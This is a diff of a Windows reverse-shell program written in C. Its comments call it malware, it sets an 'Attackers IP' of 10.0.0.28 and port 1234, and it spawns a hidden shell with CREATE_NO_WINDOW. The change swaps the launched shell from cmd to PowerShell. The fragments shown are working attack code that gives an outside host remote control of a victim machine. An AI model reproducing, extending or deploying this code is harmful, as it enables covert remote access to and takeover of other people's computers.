@@ -38,6 +38,7 @@ it is not a fully featured Malware product.
 #pragma comment(lib,"ws2_32") //For Socket
 
 
+
 /*------------------------- THESE ARE THE THINGS WE CAN CHANGE ---------------------------------*/
 # define CLIENT_IP (char*)"10.0.0.28" //our Attackers IP
 # define CLIENT_PORT (int)1234 //Our listening port
@@ -170,7 +171,7 @@ int RevShell(void){
 	PROCESS_INFORMATION pinfo;
     //have to set "cmd" to a modifiable array else the error:
     //iso forbids converting string constant to lpstr -wwrite-strings (aka char*)
-	char cmd[]= "cmd";
+	char cmd[]= "PowerShell";
 	CreateProcessA(NULL,cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
     
     
